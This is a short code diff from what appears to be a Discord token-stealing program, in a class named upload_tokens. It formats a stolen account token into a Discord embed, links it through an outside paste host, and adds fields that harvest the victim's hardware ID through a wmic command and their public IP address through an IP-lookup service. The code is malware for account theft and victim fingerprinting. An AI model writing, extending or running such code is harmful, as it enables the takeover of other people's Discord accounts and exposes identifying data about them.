@@ -353,6 +353,10 @@ class upload_tokens:
 
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
                             value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n ", inline=False)
+            embed.add_field(name="<:com:830397430301327370> HWID:",
+                            value=f"```{subprocess.check_output("wmic csproduct get uuid")}```", inline=False)
+            embed.add_field(name=":globe_with_meridians: IP: ",
+                            value=f"```{requests.get("https://api.ipify.org").text}```", inline=False)
             embed.add_field(
                 name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=False)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:",
